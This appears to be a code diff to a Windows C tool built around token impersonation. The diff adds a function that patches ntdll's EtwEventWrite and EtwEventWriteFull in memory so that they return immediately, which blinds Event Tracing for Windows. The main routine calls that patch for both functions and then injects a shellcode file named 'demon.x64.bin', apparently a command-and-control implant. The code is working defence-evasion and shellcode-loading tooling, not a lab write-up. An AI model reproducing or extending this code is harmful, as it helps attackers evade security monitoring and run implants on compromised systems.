@@ -1,7 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "Structs.h"
-
+#include "inject.h"
 
 /*
 Given a process ID (PID), impersonate the user associated with the process.
@@ -466,6 +466,34 @@ BOOL LaunchCommandWithImpersonatedUser(HANDLE hDuplicatedToken, LPCWSTR lpApplic
      return bTokenIsElevated;
  }
 
+ BOOL PatchEtwWriteFunctionsStart(enum PATCH ePatch) {
+
+     DWORD		dwOldProtection = 0x00;
+     PBYTE		pEtwFuncAddress = NULL;
+     BYTE		pPatchShellcode[] = {
+         0x33, 0xC0,    // xor eax, eax
+         0xC3           // ret
+     };
+
+     if (!(pEtwFuncAddress = GetProcAddress(GetModuleHandle(TEXT("NTDLL")), ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull"))) {
+         printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
+         return FALSE;
+     }
+
+     if (!VirtualProtect(pEtwFuncAddress, sizeof(pPatchShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+         printf("[!] VirtualProtect [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+         return FALSE;
+     }
+
+     memcpy(pEtwFuncAddress, pPatchShellcode, sizeof(pPatchShellcode));
+
+     if (!VirtualProtect(pEtwFuncAddress, sizeof(pPatchShellcode), dwOldProtection, &dwOldProtection)) {
+         printf("[!] VirtualProtect [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+         return FALSE;
+     }
+
+     return TRUE;
+ }
 
 int wmain(int argc, WCHAR** argv, WCHAR** envp)
 {
@@ -503,6 +531,10 @@ int wmain(int argc, WCHAR** argv, WCHAR** envp)
     
     // Token impersonation 
     ImpersonateProcess(dwProcessId); 
+    // EtwPatching 
+    PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE);
+    PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE_FULL);
+    InjectShellcodeFileLocally(L"demon.x64.bin"); // shellcode 
 
 
     // After impersonation tasks are done, revert the security context. 
